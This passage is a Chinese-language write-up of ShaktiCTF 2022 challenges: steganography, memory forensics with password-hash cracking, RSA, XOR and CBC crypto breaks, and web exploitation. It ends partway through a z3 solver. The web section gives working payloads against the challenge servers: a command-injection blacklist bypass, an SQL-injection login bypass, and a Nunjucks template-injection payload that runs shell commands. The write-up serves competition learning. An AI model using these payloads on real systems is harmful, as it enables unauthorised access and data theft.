# ShaktiCTF
###### tags: `CTF`

## Misc
### Sanity
![](https://i.imgur.com/bCxQrqS.png)

discord -> get role -> misc -> 公告

![](https://i.imgur.com/5k0Jd8r.png)

shaktictf{w31c0m3_t0_shaktictf_2022!}

### Greeky Fix
![](https://i.imgur.com/8Hmz8C7.png)

:::spoiler greeky_fix_chall.py
```python=
key = chr(0x04) Z chr(0x01) Z chr(0x12) Z chr(0x0f) Z chr(0x1b) Z chr(0x04) Z chr(0x14) Z chr(0x1d) Z chr(0x15) Z chr(0x1f) Z chr(0x3a) Z chr(0x32) Z chr(0x05) Z chr(0x36) Z  chr(0x10) Z chr(0x54) Z chr(0x3d) Z chr(0x3f) Z chr(0x44) Z chr(0x0a) Z chr(0x44) Z chr(0x45) Z chr(0x4e) Z chr(0x10)
flag_list
new_secret
def secret_xor(secret, key):
    new_secret = (secret * (int(len(key)/len(secret))+1))[:len(key)]
    flag_list = [chr((ord(a) ^ ord(b))) for a,b in zip(new_secret, key)]
return "".join(flag_list)
    

flag = secret_xor(secret,key)

if flag = "":
    print("Oh ho!! U didn't get it right :(")
else:
    print(flag)
```
:::

馬的怪題

從提供的程式檔中可看出有一個 key 和 secret，做完 xor 後是 flag

而另外有一個看起來很像是 key 的東西，但沒看到 secret

由於 flag 開頭已知，可以使用已知明文攻擊找出 secret，破解 xor

首先對 key 和已知的 flag 開頭做 xor，找出 secret 可能為 wisdom

![](https://i.imgur.com/HMIQaTR.png)

使用 wisdom 與 key 做 xor，得出 flag

![](https://i.imgur.com/elLQ9Od.png)

shaktictf{U_r_c0RR3c7!!}

### Winter Reindeer
![](https://i.imgur.com/0jxt9GM.png)

hint:
![](https://i.imgur.com/AdyUYYe.png)

:::spoiler snow_chal.txt
```
	    	   		   	       	     	     	     	       
      	    	    	     	 	  	 	     	   	      
    	   	 	   	      	   	    	 	    	   
 	     		  	     	     	 	 	       	   
 	 	       	  	     	 	  	   	   	  
 	  	 	   	     	  	      	 	     	     
      	      	      	       	  	   	   	     	 

```
:::

別懷疑，檔案就是一坨空白

從題目的 winter 、檔案名稱的 snow、whitespace encoding 之類的可以找到一個叫做 snow 的隱寫術工具，主要就是將文字變成空白的方式編碼

嘗試使用他作為解碼工具

```bash=
stegsnow -C snow_chall.txt
```

![](https://i.imgur.com/ZzBZmcm.png)

發現解出來是一坨垃圾

除了直接編碼之外，這個工具還可以透過用密碼的方式加以保護內容，嘗試找密碼

根據題目敘述和提示，推測密碼可能是一個人名，把題目敘述的問題丟到 google 後，找到有三個可能的人

```
Gerolamo Cardano
Robert Hooke
Jim Drake
```

一個一個試，答案就是第一個人

```bash=
stegsnow -C -p "Gerolamo Cardano" snow_chall.txt
```

shaktictf{H4v3_4_5n0wy_c7f}

### Feedback

填問卷

![](https://i.imgur.com/iPVQ70H.png)

shaktictf{Th4nk_y0u_f0r_p4rticip4ting_1n_shaktiCTF}

## forensics
### Follow Up
![](https://i.imgur.com/usIhnLk.png)

給了一個 pcap 檔案，使用 wireshark 打開分析

在 protocol hierarchy 發現有 data 區段資料，設定成 filter

![](https://i.imgur.com/sE2An0o.png)

從前面 4 的封包的內容發現似乎是一個 png 檔案，嘗試將全部資料封成一個 png

獲得以下圖片

![](https://i.imgur.com/406qZ3l.png)

shaktictf{that_was_e4sy!}

### Mission 1
![](https://i.imgur.com/wYnjNXv.png)

總而言之，拿到了一個 memory dump 檔案，要求要拿到
1. Challenge.raw 的 sha1sum
2. TroubleMaker 帳號的密碼
3. 取得 image 工具的 PID

第一個最簡單，拿到檔案後執行 `sha1sum Challenge.raw`，得到 `ed85ee47484e503787277807d3ef999586aecf1b`

第二個開始要使用 volatility 工具

第二個可參考[此文章](https://www.aldeid.com/wiki/Volatility/Retrieve-password)，使用 hashdump 功能，取得帳號密碼的 hash

```bash=
python vol.py -f Challenge.raw windows.hashdump.Hashdump
```
```
User	rid	lmhash	nthash

Administrator	500	aad3b435b51404eeaad3b435b51404ee	10eca58175d4228ece151e287086e824
Guest	501	aad3b435b51404eeaad3b435b51404ee	31d6cfe0d16ae931b73c59d7e0c089c0
TroubleMaker	1001	aad3b435b51404eeaad3b435b51404ee	8222c982da6adde81e54c0aeaac4dbed
HomeGroupUser$	1002	aad3b435b51404eeaad3b435b51404ee	94d88807b15429eb5d7e8f504f3499d1
```

可知道 TroubleMaker 帳號密碼的 hash 為 `8222c982da6adde81e54c0aeaac4dbed`，丟到 crackstation 可得到 `londonbridge`

![](https://i.imgur.com/NID4S0C.png)

第三題，使用 pslist 功能，取得 PID 資訊

```bash=
python vol.py -f ./Challenge.raw windows.pslist
```
```
Volatility 3 Framework 2.4.0

PID	PPID	ImageFileName	Offset(V)	Threads	Handles	SessionId	Wow64	CreateTime	ExitTime	File output

4	0	System	0xfa80036d0040	86	537	N/A	False	2022-12-08 19:58:23.000000 	N/A	Disabled
272	4	smss.exe	0xfa8004858040	2	29	N/A	False	2022-12-08 19:58:23.000000 	N/A	Disabled
356	348	csrss.exe	0xfa80047de060	8	431	0	False	2022-12-08 19:58:33.000000 	N/A	Disabled
408	400	csrss.exe	0xfa80061abb00	9	225	1	False	2022-12-08 19:58:37.000000 	N/A	Disabled
440	400	winlogon.exe	0xfa80061ad4c0	3	113	1	False	2022-12-08 19:58:37.000000 	N/A	Disabled
448	348	wininit.exe	0xfa80061bc660	3	76	0	False	2022-12-08 19:58:37.000000 	N/A	Disabled
512	448	services.exe	0xfa8006236b00	9	208	0	False	2022-12-08 19:58:39.000000 	N/A	Disabled
520	448	lsass.exe	0xfa8006242930	8	769	0	False	2022-12-08 19:58:40.000000 	N/A	Disabled
528	448	lsm.exe	0xfa8005faeb00	10	148	0	False	2022-12-08 19:58:40.000000 	N/A	Disabled
620	512	svchost.exe	0xfa80062ba4f0	9	351	0	False	2022-12-08 19:58:45.000000 	N/A	Disabled
680	512	VBoxService.ex	0xfa80062f6510	13	125	0	False	2022-12-08 19:58:46.000000 	N/A	Disabled
736	512	svchost.exe	0xfa80062fab00	7	266	0	False	2022-12-08 19:58:47.000000 	N/A	Disabled
824	512	svchost.exe	0xfa800632c060	22	557	0	False	2022-12-08 19:58:47.000000 	N/A	Disabled
884	512	svchost.exe	0xfa800636d460	29	532	0	False	2022-12-08 19:58:49.000000 	N/A	Disabled
912	512	svchost.exe	0xfa800634ab00	18	482	0	False	2022-12-08 19:58:49.000000 	N/A	Disabled
940	512	svchost.exe	0xfa800637bb00	32	922	0	False	2022-12-08 19:58:49.000000 	N/A	Disabled
236	824	audiodg.exe	0xfa80063be370	5	123	0	False	2022-12-08 19:58:51.000000 	N/A	Disabled
368	512	svchost.exe	0xfa80063efb00	14	465	0	False	2022-12-08 19:58:56.000000 	N/A	Disabled
1184	512	spoolsv.exe	0xfa80064ef9d0	14	290	0	False	2022-12-08 19:59:01.000000 	N/A	Disabled
1220	512	svchost.exe	0xfa800650a860	19	316	0	False	2022-12-08 19:59:02.000000 	N/A	Disabled
1312	512	svchost.exe	0xfa8006551b00	10	148	0	False	2022-12-08 19:59:03.000000 	N/A	Disabled
1400	512	svchost.exe	0xfa8006597b00	19	274	0	False	2022-12-08 19:59:03.000000 	N/A	Disabled
1676	512	taskhost.exe	0xfa80066c1060	9	215	1	False	2022-12-08 19:59:07.000000 	N/A	Disabled
1896	512	sppsvc.exe	0xfa80065f3b00	4	143	0	False	2022-12-08 19:59:10.000000 	N/A	Disabled
1484	884	dwm.exe	0xfa8006721b00	3	99	1	False	2022-12-08 19:59:40.000000 	N/A	Disabled
1452	1264	explorer.exe	0xfa80037ed3f0	39	874	1	False	2022-12-08 19:59:41.000000 	N/A	Disabled
1060	1452	VBoxTray.exe	0xfa80067e9500	14	149	1	False	2022-12-08 19:59:47.000000 	N/A	Disabled
1556	512	SearchIndexer.	0xfa8005f7eb00	14	655	0	False	2022-12-08 20:00:15.000000 	N/A	Disabled
2176	512	wmpnetwk.exe	0xfa80068b0b00	14	431	0	False	2022-12-08 20:00:37.000000 	N/A	Disabled
2416	512	svchost.exe	0xfa80037c0b00	11	356	0	False	2022-12-08 20:00:48.000000 	N/A	Disabled
2612	1452	cmd.exe	0xfa80038438f0	1	21	1	False	2022-12-08 20:01:16.000000 	N/A	Disabled
2628	408	conhost.exe	0xfa800654e060	2	53	1	False	2022-12-08 20:01:19.000000 	N/A	Disabled
2728	1452	iexplore.exe	0xfa800388db00	10	486	1	False	2022-12-08 20:01:39.000000 	N/A	Disabled
2064	512	mscorsvw.exe	0xfa8003931b00	6	84	0	True	2022-12-08 20:02:09.000000 	N/A	Disabled
2508	620	WmiPrvSE.exe	0xfa80039ef7b0	7	112	0	False	2022-12-08 20:02:28.000000 	N/A	Disabled
2604	512	mscorsvw.exe	0xfa8003a827b0	5	79	0	False	2022-12-08 20:02:37.000000 	N/A	Disabled
2172	512	svchost.exe	0xfa8003b46060	9	249	0	False	2022-12-08 20:03:20.000000 	N/A	Disabled
1076	2728	iexplore.exe	0xfa8003b23220	20	549	1	True	2022-12-08 20:03:37.000000 	N/A	Disabled
636	1452	DumpIt.exe	0xfa8003798060	2	45	1	True	2022-12-08 20:05:34.000000 	N/A	Disabled
2012	408	conhost.exe	0xfa8003ae1b00	2	52	1	False	2022-12-08 20:05:36.000000 	N/A	Disabled
```

其中在 PID 636 的地方可以看到有一個 `DumpIt.exe`，看起來很可疑，搜尋一下後發現是一個 memory dumper，符合第三題的敘述

綜合以上，拼起來得到 flag

shaktictf{ed85ee47484e503787277807d3ef999586aecf1b_londonbridge_636}

### Fishy File
![](https://i.imgur.com/s32siO9.png)

拿到檔案，先 file 看看

![](https://i.imgur.com/I1GooWZ.png)

看一下 xxd

![](https://i.imgur.com/W4RdU6M.png)

看起來是一個 pdf，且整個檔案被反轉過了，寫個程式轉回來

:::spoiler solve.py
```python=
with open("shakti.dat", "rb") as fh:
    data = fh.read()

with open("shakti2.pdf", "wb") as fh:
    fh.write(data[::-1])
```
:::

打開檔案，沒看到特別的東西

![](https://i.imgur.com/zuYwagW.png)

使用 binwalk，發現似乎藏有 png

![](https://i.imgur.com/oj1urgP.png)

執行指令匯出所有檔案
```bash=
binwalk -e shakti2.pdf --dd=.*
cd _shakti2.pdf-0.extracted/
cp 413B 413B.png
```

但打不開

![](https://i.imgur.com/PTNaFKh.png)

使用 pngcheck 工具，發現是 IHDR 被拼錯了，嘗試修改

![](https://i.imgur.com/m6utWCr.png)
![](https://i.imgur.com/KQLL5bf.png)

接下來檢查到有 IDAT 變成小寫的問題

![](https://i.imgur.com/ZAs7wnX.png)

以及 IEND 拼錯

![](https://i.imgur.com/h5cdc4U.png)

最後是 IEND 後面多了很多垃圾

![](https://i.imgur.com/jpWSfgU.png)

修改完之後就 ok 了

![](https://i.imgur.com/vc9ZucB.png)

打開得到圖片

![](https://i.imgur.com/pkQM7Yw.png)

shaktictf{Y0Uuu_G0t_Th1Ss5}

## Crypto
### Eazy_peaZy
![](https://i.imgur.com/rzVf87f.png)

:::spoiler eazy_peazy.py
```python=
flag='shaktictf{#####REDACTED#####}'
s=''
for i in flag:
    s+=chr((ord(i)-15))
print(base64.b64encode(bytes(s,'utf-8')))

#b'ZFlSXGVaVGVXbFRjamFlIVAiZFBkZmEkY1BWUmtqampqampQWFQlJCNlYyYnWCVlYyYlbg=='
```
:::

就 base64 解碼之後位移一下字母就出來了

![](https://i.imgur.com/3bHdZKd.png)

https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)ADD(%7B'option':'Decimal','string':'15'%7D)&input=WkZsU1hHVmFWR1ZYYkZSamFtRmxJVkFpWkZCa1ptRWtZMUJXVW10cWFtcHFhbXBRV0ZRbEpDTmxZeVluV0NWbFl5WWxiZz09

shaktictf{crypt0_1s_sup3r_eazyyyyyy_gc432tr56g4tr54}

### secRets_And_seCReTs
![](https://i.imgur.com/1Vv8sfn.png)

:::spoiler chall.py
```python=
from Crypto.Util.number import *

flag=b"#########REDACTED#########"

n=[getPrime(512) for _ in range(3)]
n=[8722540009234070247614687250654407242443098960521889927638169603994447523278398949052234586867149142397946752296113268097476897402751079151430185069380019,
 7748390830619438628598461672002256107736202041283980575594114738792667049612675190299231384130518428001436332199784230830361296805998178862622627821106411,
 12992001107762284853924107072566691259373024612699267823574353409729296618405485466359139269067615966447864990530610158839653182793355847359198838835594411]
c=[1411653708282913345423368557671871591664438381629501903851153161454445916121359905705692712233369895756996170441640578174610106571066191790012378520429743,
 2861865990314714540093636102814256470323315183310888629544832686169355957218120916189696143602437816851535307621641620697566853687152831782355649417978952,
 376492284239858752271882252381292364517711829294783943816555345285629896042539317245807593032505251819708007746820040182429681780320868266166620015593930]

for i,j in zip(c,n):
    assert(x%j==i)

secret=4302040125834928853558463909476079954473400865172251180160558435767130753932883186010390855112227834689861010095690778866857294344059634143100709544931839088413113732983879851609646261868420370506958223094475800449942079286436722629516277911423054845515342792094987249059810059640127872352101234638506603087565277395480953387647118861450659688484283820336767116038031727190397533082113134466893728210621302098082671125283992902107359805546865262918787687109747546968842757321383287635483017116189825332578143804402313162547301864633478350112638450973130720295084401400762328157586821639409421465548080122760881528019152451981418066119560584988658928643613995792058313513615847754001837873387949017975912403754727304537758597079167674369192909953480861392310713676253433998929652777155332408050107725317676660176980502406301244129743702460065671633250603271650634176695472477451658931634382635748322647891956353158570635160043
e=65537
ct=16958627479063955348415964384163116282602743039742753852934410863378528486785270030162782732192537726709536924276654783411884139339994697205619239406660459997082991141519385345070967253589282293949945894128620519748508028990727998488399564805026414462500253524261007024303476629172149332624303860869360966809845919057766279471870925180603362418449119409436609700813481467972962774900963043970140554494187496533636616384537667808308555402187685194879588448942654070984762583024927082993513125305565020701004973206532961944433936049713847420474363949095844995122469523084865481364653146506752587869477287886906616275417

assert(long_to_bytes(pow(ct,d,secret//x))==flag.decode())
```
:::

馬的怪題

從題目可知道有一個 x，x 在 mod $n_i$ 後得到 $c_i$

可以透過 CRT 來解出 x

後面又可得知，$ct^d\ mod\ (secret / x) = flag$，沒有其他線索了

這段看起來像是 RSA，且題目名稱的提示看起來也是，所以推測原來是使用 RSA 做計算

而 secret/x 這個看起來是 RSA 中的 n，在沒有線索的情況下丟到 factordb 看有沒有已算好的結果

http://factordb.com/index.php?query=24527876714777610556168704102334063247745307067942987179946992203143782911214218738693269763284353107444558551004104842495208613554362680493609315262323088218069305109094883023250460622553819850578030167910933028392613333549556209547555445147475324578694902644739395420556980677634640744378713609298141891560253460328397733071122264628468706243972435551492706426936176969047044900758569383152320313902601091822535952698142154712130550473808314533625099780507036524949344974327532792045713711551245809959038345909568860198589805752319051021759477458800632328558389734253607892450861044270982742648526813361769154927281
![](https://i.imgur.com/QT0WCyg.png)

很明顯的有，且是一個看起來是質數的平方計算出來的，因此可知道 RSA 中 p 的值

接著也可以直接計算解密金鑰 d，要注意的是由於 N 是使用 $p^2$ 計算的，所以 $\phi(n)$ 的公式會變成 $\phi(n) = p \times (p-1)$

:::spoiler solve.py
```python=
from sage.all import *
from gmpy2 import isqrt

n=[8722540009234070247614687250654407242443098960521889927638169603994447523278398949052234586867149142397946752296113268097476897402751079151430185069380019,
 7748390830619438628598461672002256107736202041283980575594114738792667049612675190299231384130518428001436332199784230830361296805998178862622627821106411,
 12992001107762284853924107072566691259373024612699267823574353409729296618405485466359139269067615966447864990530610158839653182793355847359198838835594411]
c=[1411653708282913345423368557671871591664438381629501903851153161454445916121359905705692712233369895756996170441640578174610106571066191790012378520429743,
 2861865990314714540093636102814256470323315183310888629544832686169355957218120916189696143602437816851535307621641620697566853687152831782355649417978952,
 376492284239858752271882252381292364517711829294783943816555345285629896042539317245807593032505251819708007746820040182429681780320868266166620015593930]

x = crt(c, n)

for i,j in zip(c,n):
    assert (x%j==i)

secret=4302040125834928853558463909476079954473400865172251180160558435767130753932883186010390855112227834689861010095690778866857294344059634143100709544931839088413113732983879851609646261868420370506958223094475800449942079286436722629516277911423054845515342792094987249059810059640127872352101234638506603087565277395480953387647118861450659688484283820336767116038031727190397533082113134466893728210621302098082671125283992902107359805546865262918787687109747546968842757321383287635483017116189825332578143804402313162547301864633478350112638450973130720295084401400762328157586821639409421465548080122760881528019152451981418066119560584988658928643613995792058313513615847754001837873387949017975912403754727304537758597079167674369192909953480861392310713676253433998929652777155332408050107725317676660176980502406301244129743702460065671633250603271650634176695472477451658931634382635748322647891956353158570635160043
e=65537
ct=16958627479063955348415964384163116282602743039742753852934410863378528486785270030162782732192537726709536924276654783411884139339994697205619239406660459997082991141519385345070967253589282293949945894128620519748508028990727998488399564805026414462500253524261007024303476629172149332624303860869360966809845919057766279471870925180603362418449119409436609700813481467972962774900963043970140554494187496533636616384537667808308555402187685194879588448942654070984762583024927082993513125305565020701004973206532961944433936049713847420474363949095844995122469523084865481364653146506752587869477287886906616275417

nn = secret // x
p = isqrt(nn)

assert (p*p == nn)

phi = p * (p-1)

d = pow(e, -1, phi)

m = pow(ct, d, nn)

from Crypto.Util.number import long_to_bytes

print(long_to_bytes(m))
```
:::

shaktictf{w0w_you_kn0w_h0w_RSA_&_CRT_w0rks_!}

### cAex0r
![](https://i.imgur.com/59iLC2E.png)

:::spoiler cAex0r.py
```python=
from secret import flag
from random import randint
from pwn import xor
from os import urandom
stride = randint(1,27)
s1 = flag[:len(flag)//2]
s2 = flag[len(flag)//2:]
key = urandom(3)

def cass (text,stride):
    u_alpha="ABCDEFGHIJKLMNOPQRSTUVWXYZ"
    l_alpha="abcdefghijklmnopqrstuvwxyz"
    enc_text = ""
    for i in text:
        if i>=65 and i<= 90:
            enc_text += u_alpha[(u_alpha.find(chr(i)) - stride)%26]
        elif i>=97 and i<= 122:
            enc_text += l_alpha[(l_alpha.find(chr(i)) - stride)%26]
        else:
            enc_text += chr(i)
    return enc_text.encode()

c = xor(cass(s1+s2,stride),key)
x = open("ciphertext.txt", "wb") 
x.write((c))
```
:::

在程式中可以看到，會先對 flag 做 caesar 的轉換後進行 xor 加密，並輸出

可以看到，在 caesar 的部分沒有對非字母的部分進行轉換，也就是說 flag 的 `{`, `}` 字元不會被轉換，也就可以嘗試透過明文攻擊找出部分的 xor key

而 xor key 的長度是 3 bytes，而 flag 的 index 9 和 63 是 `{`, `}`，做一下 xor 後得出 key 的開頭為 0x22，不過剩下的 key 無法確定

由於只要猜 2 個字元即可，因此我寫了一個程式嘗試將所有可能的 key 和解出來的明文輸出

:::spoiler solve.py
```python=
import string
from pwn import xor

with open("./ciphertext_15c434ca-401e-4497-b782-53050680758d.txt", "rb") as fh:
    data = fh.read()

found = False
for i in [0x22]:
    for j in range(256):
        for k in range(256):
            key = bytes([i,j,k])
            decrypted = xor(data, key)
            if(all([chr(d) in string.printable for d in decrypted]) and all([chr(d) in string.ascii_lowercase for d in decrypted[:9]])):
                print(decrypted, key)
```
:::

![](https://i.imgur.com/FZt3ITw.png)

得出最可能的 key 為 `0x22 0x08 0xcd`

使用 cyberchef 繼續破解 caesar 位移

![](https://i.imgur.com/M9a0pwV.png)

用手算一下發現位移剛好是 13，使用 rot13 破解 caesar 拿 flag

![](https://i.imgur.com/C16R3z8.png)

https://gchq.github.io/CyberChef/#recipe=From_Hex('Auto')XOR(%7B'option':'Hex','string':'22%2008%20cd'%7D,'Standard',false)ROT13(true,true,false,13)&input=NDQgN0QgQTMgNUEgNkYgQkIgNTIgNkYgQkUgNTkgNjIgQkYgNUIgNTggQUYgNTggM0IgOTIgNDUgMzggOTIgNTIgNEQgQTEgNDEgNkYgOEYgNDAgNTcgODcgNDAgNEQgOTQgNzMgNTcgRkEgMTUgMzAgRjkgMTQgNjcgRkMgMTAgNjcgQkUgNTMgMzEgQTIgMUIgMzkgQkYgNEQgNzggQkYgMTQgM0YgQTIgMTAgM0IgRkIgNEMgNjYgRjkgNUY

shaktictf{welCom3_t0_cRyptOo_WoRLD_77846b12bfd9b91ebce67b236aa4}

### d0uble_cbc
![](https://i.imgur.com/4Pjv1E8.png)

:::spoiler chall.py
```python=
from Crypto.Cipher import AES  
from Crypto.Util.Padding import pad,unpad  
from Crypto.Util.strxor import strxor
from secret import key,flag ,iv
from os import *

def encryptt(pt):  
    print(pt, len(pt))
    return (AES.new(key,AES.MODE_CBC,iv)).encrypt(pad(pt,16))   
   
def decryptt(ct):  
    if len(ct)%16 == 0:  
        return (AES.new(key,AES.MODE_CBC,iv)).decrypt(ct)  
    elif len(ct)%16 != 0:  
        return (unpad((AES.new(key,AES.MODE_CBC,iv)).decrypt(ct) , 16))                                                                                 
  
def verify_ivv(iv,iv_detected):
    if iv.hex() == iv_detected:
        print("Yooo... you are going good, move forward with some more courage")
        return True
    else:
        print("Don't lose hope buddy , you can get through this, try again ")
        return False

def sign(iv,key,message):
    try:
        cbc = AES.new(key, AES.MODE_CBC,iv)
        messageblocks = [message[i:i + 16] for i in range(0, len(message), 16)]
        tag = cbc.encrypt(messageblocks[0])
        for i in range(1,len(messageblocks)):   
            cbc1 = AES.new(key, AES.MODE_CBC,tag)
            tag = cbc1.encrypt(messageblocks[i])
        return tag.hex()
    except:
        print("\nNo padding done here !, try again ")
        exit()

 

def main():
    print("******************************Welcome to the john's CBC server************************")
    print("You really wanna get into the system? \n then search for IV ")
    print("Choose 1 option among four \n \t 1.Encrypt the plain text \n \t 2.Decrypt the ciphertext \n \t 3.feed IV \n \t 4.exit")
    op = int(input())
    if op == 1:
        print("I will provide the encrypted text for you")
        print("Input the plaintext in hex format\n")
        pt = input()
        ct = encryptt(bytes.fromhex(pt)).hex()
        print(len(ct))
        print(f"cipher text for provided" , ct);
    if op == 2:
        print("I will provide the reasonable plaintext for you")
        print("Input the cipher text in bytes to decrypt")
        ct = input()
        pt = decryptt(bytes.fromhex(ct)).hex()
        print(f"decrypted text for provided" , pt);
    if op == 3:
        print("Provide reasonable IV to proceed further")
        iv_detected = input()
        verify_iv = verify_ivv(iv,iv_detected) 
        print(verify_iv)
        if verify_iv:
            print("Let me see whether you are worth enough to gain my gold coins.")
            print("To prove yourself, give me two different hex-encoded messages that could sign to the same tag.")
            print("Now press '0' to get your hex inputs signed and press 1 to submit two same messages")
            iv_detected = bytes.fromhex(iv_detected)
            x = input()
            if x == '0':
                print("Input hash encoded message:\n")
                msg = bytes.fromhex(input())
                x = sign(iv_detected,key,msg)
                print("\n Tag for your message")
                print(x)
            if x == '1':
                msg1 = bytes.fromhex(input("\nMessage #1: \n"))
                msg2 = bytes.fromhex(input("\nMessage #2: \n"))
                if(msg1 == msg2):
                    print("\nThis is not a correct way to do this, think again!!!")
                    exit()
                if(msg1 != msg2 and sign(iv_detected,key,msg1)==sign(iv_detected,key,msg2)):
                    print(flag)
                    exit()
                else:
                    print("\nOops! They don't match!...Better luck next time!")
                    exit()                
        if op==4:
            exit()          



if __name__ == '__main__':
    main()
```
:::

在程式中可以看到，這個服務提供了加解密功能，使用 AES 的 CBC mode，需要我們猜出 iv 以及要找出兩個不同東西但 sign 出來東西相同的配對

首先先破解 iv，以下是 cbc 的結構圖

![](https://i.imgur.com/dnUzHF0.png)

這篇我破解的核心關鍵是想辦法有一個原始 AES 輸入為全 0 的輸出結果，有了這組向量就可以在 CBC 解密時自動把 IV 輸出出來 (AES 解密出來是 0，做完 xor 後就是 iv)

而要怎麼產生這組全 0 輸出結果呢，首先我們要先在 CBC 情況下輸入隨便一組向量並得到輸出結果，而接著就可以利用這組輸出放在第二個 CBC AES 的輸入中，由於第二組的 IV 會等同於第一組的輸出，因此 xor 後剛好等同於在純 AES 下的輸入全 0，完美

接著只要把它拿去解密就可以了

在實際的例子中，首先輸入 16 個全 0 向量

![](https://i.imgur.com/ToY3qx4.png)

這邊輸出會是 32 byte 的原因是 encrypt 的部分有 pad 到 16，反正切出前 16 byte 即可

接著把 16 個全 0 向量串接上一個輸出後，得到第二組輸出

![](https://i.imgur.com/dcCz3cx.png)

切出輸出的 16~32 byte 部分

把結果拿去解密，拿到 iv

![](https://i.imgur.com/Hi5QbsC.png)

在例子中，得出的 iv 為 `415f68617070795f6362635f6d6f6465`

確認 iv 結果正確

![](https://i.imgur.com/5teBL8z.png)

接著下一步就是要找出輸入不同輸出相同的 sign 配對

再次觀察 sign 函數，發現只是輸出最後一個 block 的結果而已

因此想辦法偽造讓二者的最後一個 CBC AES 輸出相同即可，以下是我偽造的方法

首先先產生一組 16 個 0 的輸入，並記錄下輸出，這邊輸出等同於 iv 輸入到純 AES 的輸出

接著計算前面輸出與 iv 做 xor 後的結果，並作為第二個 CBC AES block 的輸入，由於輸入後會在和上一個 block 輸出做 xor，也就等同於讓 iv 進入到純 AES 的部分並得到輸出

因此以上二者雖然內容不同，但 sign 出來的結果相同

在實務上，首先先輸入 16 個全 0 輸入

![](https://i.imgur.com/kLN9XRt.png)

輸出基本上就是前面算出來的結果

接著計算這個結果和 iv 的 xor，得到 `47ccd88a8e0de06cf12b5c2ea89b0d48`，將 16 個全 0 串接這個數值，並丟進去 sign 看看

![](https://i.imgur.com/MeMV3fm.png)

可以看到二者 sign 的結果完全相同

最後就是拿 flag

![](https://i.imgur.com/dWHWTH7.png)

shaktictf{double_cheese_double_mac_yummyyyy_4120686170707920636263206d6f6465}

## Web
### Be Alert
![](https://i.imgur.com/HmPrqet.png)

一進首頁只有一個機器人

![](https://i.imgur.com/RGXw20a.png =400x)

根據題目敘述提示，看一下網站原始碼

![](https://i.imgur.com/lhW3zZs.png)

看到有 `/flag.html` 路徑

進來後看到需要密碼

![](https://i.imgur.com/xUmDp0y.png)

老樣子先看原始碼

![](https://i.imgur.com/nk3qK6O.png)

看到有關於密碼的東東

逆一下，把字串每個字加上 1，得到密碼 `shaktiadmin`

![](https://i.imgur.com/h5Drsko.png)

丟進去，彈出 flag

![](https://i.imgur.com/JgU6t8L.png)

shaktictf{c0n9r4t5_u53r_hehe65445746}

### ping-pong
![](https://i.imgur.com/rtB07qO.png)

明顯就是 command injection 題

進入後，提示使用 `/ping?address=google.com` 使用 ping

![](https://i.imgur.com/9tFFgaU.png)

嘗試使用 `address=google.com;ls`，發現有 `Not Allowed`，推測有黑名單

![](https://i.imgur.com/aRjSW9r.png)

經過嘗試，發現是 `;` 在黑名單裡，使用 `|` 代替

```
address=google.com|ls
```

![](https://i.imgur.com/XhISJYC.png)

成功執行，發現 `flag.txt`

嘗試使用 cat 指令來讀取內容，發現又有黑名單

```
address=google.com|cat%20flag.txt
```

![](https://i.imgur.com/aRjSW9r.png)

發現是 `cat` 指令被擋，改用 `more`

```
address=google.com|more%20flag.txt
```

![](https://i.imgur.com/2o6BFmH.png)

成功拿到 flag

shaktictf{c0mm4nd_1nj3cti0n_iz_3asy_right??}

### L0g1n F4il3d
![](https://i.imgur.com/fFGOfcS.png)

連進來後，發現有要輸入帳號密碼

![](https://i.imgur.com/NlBIA5K.png)

且發現真的會送封包出去，不是刻在 js 的那種

![](https://i.imgur.com/QfhbPhC.png)

看起來一臉 sqli，嘗試使用 `' or 1=1 -- #`

![](https://i.imgur.com/uujpjE9.png)

shaktictf{s1mpl3_sql_inject1on_ehehhehe564321345}

### Hey h3ck3r!
![](https://i.imgur.com/qKq7zKE.png)

進入後，發現有一個輸入名字的地方

![](https://i.imgur.com/tGUl7yQ.png)

猜有可能有 ssti 漏洞

輸入 `{{ 7*7 }}`

![](https://i.imgur.com/zslwZEE.png)

確認是 SSTI

推測可能是 jinja2，使用 payloadAllTheThing 的 payload 執行 RCE

```
{{ namespace.__init__.__globals__.os.popen('ls -al').read() }}
```

噴錯

![](https://i.imgur.com/Gg2UKgi.png)

發現這題似乎是用一個叫做 nunjucks 的模板引擎，搜尋相關 ssti payload

找到[這篇文章](https://disse.cting.org/2016/08/02/2016-08-02-sandbox-break-out-nunjucks-template-engine)

使用以下 payload，執行命令列出目錄

```!
{{range.constructor("return global.process.mainModule.require('child_process').execSync('ls -al')")()}}
```

![](https://i.imgur.com/jYXRb5S.png)

看到有個 flag 檔案

使用以下命令讀取檔案

```!
{{range.constructor("return global.process.mainModule.require('child_process').execSync('cat flag')")()}}
```

![](https://i.imgur.com/xM00awO.png)

shaktictf{ohh!!!_nuunjucksssss_ssti}

## Reverse
### Love Calculator
![](https://i.imgur.com/K6fsilz.png)

快樂 ghidra 時間

重要部分在這

![](https://i.imgur.com/JfUMp2P.png)

前面會要求輸入一些拉基，反正最後最重要會有一個輸入 passcode 的部分，會比較輸入和指定的字串是否相同，相同則輸出 flag

指定字串部分是使用 strcpy 和 strcat 組合而成，我懶得看啦所以直接動態分析看組合完的東西

![](https://i.imgur.com/aEUZcib.png)

passcode 是 `l3t5_s0lv3_m0r3_ch4ll3ng3s`

包成 flag 格式就行了，或是直接執行輸入 passcode

![](https://i.imgur.com/i4b1TtQ.png)

shaktictf{l3t5_s0lv3_m0r3_ch4ll3ng3s}

### Y2 for win
![](https://i.imgur.com/VjKRRVT.png)

先丟 ghidra

在 main 的部分可以看到，會要求輸入 flag，然後進入 constrains 函式，如果回傳結果為 1 則輸出完整的 flag

![](https://i.imgur.com/ubQvlJ4.png)

而 constrains 函式裡就是一堆限制，假如都符合的話就會回傳 1

![](https://i.imgur.com/DEt0g8w.png)

直接丟 z3 求解

:::spoiler solve.py
```python=
from z3 import *

A = Array('A', IntSort(), IntSort())

solve(
    A[9] * A[0xd] - A[0x17] == 0x28a1,
    A[2] * A[5] + A[0] == 0x23bb,
    A[8] * A[2] - A[0xd] == 0x2864,
    (A[6] + A[7]) - A[0x17] == 0x8a,
    (A[0xf] + A[0x12]) - A[0xe] == 0x46,
    A[0x13] - A[0x18] * A[0xc] == -0x16b0,
    A[0x10] * A[0x15] - A[10] == 0x1276,
    A[0x11] * A[4] - A[0x16] == 0x334a,
    A[1] * A[3] - A[0xb] == 0x95b,
    A[0xb] * A[3] + A[0x14] == 0x145e,
    A[5] * A[8] - A[0x14] == 0x285c,
